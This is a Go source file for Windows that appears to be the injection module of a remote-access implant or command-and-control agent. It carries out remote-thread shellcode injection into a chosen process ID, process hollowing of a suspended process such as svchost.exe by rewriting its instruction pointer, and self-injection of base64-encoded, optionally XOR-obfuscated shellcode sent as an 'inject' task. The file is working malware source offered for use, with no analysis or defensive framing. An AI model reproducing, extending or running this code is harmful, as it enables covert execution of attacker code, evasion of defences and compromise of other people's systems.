//go:build windows

package main

import (
	"fmt"
	"strings"
	"unsafe"

	"golang.org/x/sys/windows"
)

var (
	ntdll                    = windows.NewLazySystemDLL("ntdll.dll")
	procNtUnmapViewOfSection = ntdll.NewProc("NtUnmapViewOfSection")

	k32inj                  = windows.NewLazySystemDLL("kernel32.dll")
	procVirtualAllocEx      = k32inj.NewProc("VirtualAllocEx")
	procWriteProcessMemory  = k32inj.NewProc("WriteProcessMemory")
	procCreateRemoteThread  = k32inj.NewProc("CreateRemoteThread")
	procOpenProcess         = k32inj.NewProc("OpenProcess")
	procResumeThread        = k32inj.NewProc("ResumeThread")
	procCreateProcessW      = k32inj.NewProc("CreateProcessW")
	procGetThreadContext     = k32inj.NewProc("GetThreadContext")
	procSetThreadContext     = k32inj.NewProc("SetThreadContext")
)

const (
	PROCESS_ALL_ACCESS = 0x1F0FFF
	CREATE_SUSPENDED   = 0x00000004
	CREATE_NO_WINDOW   = 0x08000000
	MEM_COMMIT_RESERVE = windows.MEM_COMMIT | windows.MEM_RESERVE
)

// injectIntoProcess allocates RWX in an existing process and runs shellcode via
// remote thread — mirrors VirtualAllocEx+WriteProcessMemory+CreateRemoteThread from church.c.
func injectIntoProcess(pid uint32, sc []byte) error {
	hProc, _, err := procOpenProcess.Call(PROCESS_ALL_ACCESS, 0, uintptr(pid))
	if hProc == 0 {
		return fmt.Errorf("OpenProcess(%d): %w", pid, err)
	}
	defer windows.CloseHandle(windows.Handle(hProc))

	addr, _, err := procVirtualAllocEx.Call(
		hProc, 0, uintptr(len(sc)),
		uintptr(MEM_COMMIT_RESERVE), windows.PAGE_EXECUTE_READWRITE,
	)
	if addr == 0 {
		return fmt.Errorf("VirtualAllocEx: %w", err)
	}

	var written uintptr
	ret, _, err := procWriteProcessMemory.Call(
		hProc, addr,
		uintptr(unsafe.Pointer(&sc[0])), uintptr(len(sc)),
		uintptr(unsafe.Pointer(&written)),
	)
	if ret == 0 {
		return fmt.Errorf("WriteProcessMemory: %w", err)
	}

	hThread, _, err := procCreateRemoteThread.Call(hProc, 0, 0, addr, 0, 0, 0)
	if hThread == 0 {
		return fmt.Errorf("CreateRemoteThread: %w", err)
	}
	procWaitForSO.Call(hThread, 10000)
	procCloseHandle.Call(hThread)
	return nil
}

// STARTUPINFOW / PROCESS_INFORMATION for CreateProcessW
type startupInfoW struct {
	Cb            uint32
	_             *uint16
	Desktop       *uint16
	Title         *uint16
	X, Y          uint32
	XSize, YSize  uint32
	XCountChars   uint32
	YCountChars   uint32
	FillAttribute uint32
	Flags         uint32
	ShowWindow    uint16
	_             uint16
	_             *byte
	StdInput      windows.Handle
	StdOutput     windows.Handle
	StdError      windows.Handle
}

type processInformation struct {
	Process   windows.Handle
	Thread    windows.Handle
	ProcessId uint32
	ThreadId  uint32
}

// hollowProcess spawns targetExe suspended, allocates RWX in its address space,
// writes shellcode, patches RIP to point at it, then resumes. Mirrors church.c ProcessHollowing.
// targetExe example: `C:\Windows\System32\svchost.exe`
func hollowProcess(targetExe string, sc []byte) error {
	target, err := windows.UTF16PtrFromString(targetExe)
	if err != nil {
		return err
	}

	si := startupInfoW{Cb: uint32(unsafe.Sizeof(startupInfoW{}))}
	var pi processInformation

	ret, _, err := procCreateProcessW.Call(
		uintptr(unsafe.Pointer(target)), 0, 0, 0, 0,
		CREATE_SUSPENDED|CREATE_NO_WINDOW, 0, 0,
		uintptr(unsafe.Pointer(&si)),
		uintptr(unsafe.Pointer(&pi)),
	)
	if ret == 0 {
		return fmt.Errorf("CreateProcess(%s): %w", targetExe, err)
	}
	defer windows.CloseHandle(pi.Process)
	defer windows.CloseHandle(pi.Thread)

	remoteAddr, _, err := procVirtualAllocEx.Call(
		uintptr(pi.Process), 0, uintptr(len(sc)),
		uintptr(MEM_COMMIT_RESERVE), windows.PAGE_EXECUTE_READWRITE,
	)
	if remoteAddr == 0 {
		windows.TerminateProcess(pi.Process, 0)
		return fmt.Errorf("VirtualAllocEx (hollow): %w", err)
	}

	var written uintptr
	ret, _, err = procWriteProcessMemory.Call(
		uintptr(pi.Process), remoteAddr,
		uintptr(unsafe.Pointer(&sc[0])), uintptr(len(sc)),
		uintptr(unsafe.Pointer(&written)),
	)
	if ret == 0 {
		windows.TerminateProcess(pi.Process, 0)
		return fmt.Errorf("WriteProcessMemory (hollow): %w", err)
	}

	// Get thread context (CONTEXT_FULL = 0x10000B on x64), patch RIP, resume.
	// CONTEXT on x64 is 1232 bytes; RIP is at offset 248.
	ctx := make([]byte, 1232)
	*(*uint32)(unsafe.Pointer(&ctx[0])) = 0x10000B
	if r, _, _ := procGetThreadContext.Call(uintptr(pi.Thread), uintptr(unsafe.Pointer(&ctx[0]))); r != 0 {
		*(*uint64)(unsafe.Pointer(&ctx[248])) = uint64(remoteAddr)
		procSetThreadContext.Call(uintptr(pi.Thread), uintptr(unsafe.Pointer(&ctx[0])))
	}

	procResumeThread.Call(uintptr(pi.Thread))
	return nil
}

// handleInject dispatches the "inject" task type.
// Payload formats (space-separated):
//   remote <PID> <BASE64_OR_KEY:BASE64>  — remote thread injection into existing PID
//   hollow <EXE_PATH> <BASE64_OR_KEY:BASE64> — process hollowing
//   <BASE64_OR_KEY:BASE64>              — self-inject (current process VirtualAlloc+CreateThread)
func handleInject(payload string) (string, error) {
	parts := strings.SplitN(payload, " ", 3)

	var scPayload string
	if len(parts) == 1 {
		scPayload = parts[0]
	} else if len(parts) >= 3 {
		scPayload = parts[2]
	} else {
		return "", fmt.Errorf("bad inject payload format")
	}

	sc, key, err := decodePayload(scPayload)
	if err != nil {
		return "", fmt.Errorf("decode: %w", err)
	}
	if key != 0 {
		for i := range sc {
			sc[i] ^= key
		}
	}

	switch parts[0] {
	case "remote":
		var pid uint32
		fmt.Sscanf(parts[1], "%d", &pid)
		if err := injectIntoProcess(pid, sc); err != nil {
			return "", err
		}
		return fmt.Sprintf("remote injection into PID %d (%d bytes) ok", pid, len(sc)), nil

	case "hollow":
		exe := parts[1]
		if err := hollowProcess(exe, sc); err != nil {
			return "", err
		}
		return fmt.Sprintf("hollowed %s (%d bytes) ok", exe, len(sc)), nil

	default:
		// Treat first token as shellcode payload directly
		sc2, key2, err := decodePayload(parts[0])
		if err != nil {
			return "", fmt.Errorf("unknown inject format")
		}
		if key2 != 0 {
			for i := range sc2 {
				sc2[i] ^= key2
			}
		}
		if err := execShellcode(sc2); err != nil {
			return "", err
		}
		return fmt.Sprintf("self-inject %d bytes ok", len(sc2)), nil
	}
}
